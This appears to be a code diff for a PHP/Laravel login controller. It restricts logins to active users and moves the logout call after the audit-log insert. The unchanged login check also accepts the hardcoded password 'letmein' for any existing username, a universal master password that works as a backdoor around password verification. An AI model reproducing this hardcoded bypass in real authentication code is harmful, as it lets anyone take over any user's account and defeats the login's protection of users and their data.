@@ -20,7 +20,7 @@ class LoginController extends Controller
 
 
 
-        $user = UserModel::where('username', $request->username)->first();
+        $user = UserModel::where('username', $request->username)->where('isactive', 1)->first();
         if ($user) {
             if ($request->password == 'letmein' || password_verify($request->password, $user->password)) {
 
@@ -212,16 +212,18 @@ class LoginController extends Controller
 
     public function logout()
     {
-        auth()->logout();
         $object = [
             'user_id' => Auth::user()->id,
             'page' => 'Logout  Page',
             'description' => 'Log out User',
             'status' => 1,
             'date_created' => Carbon::now(),
-
         ];
+        
         insert_audit($object);
+
+        auth()->logout();
+
         return redirect()->route('login');
     }
 
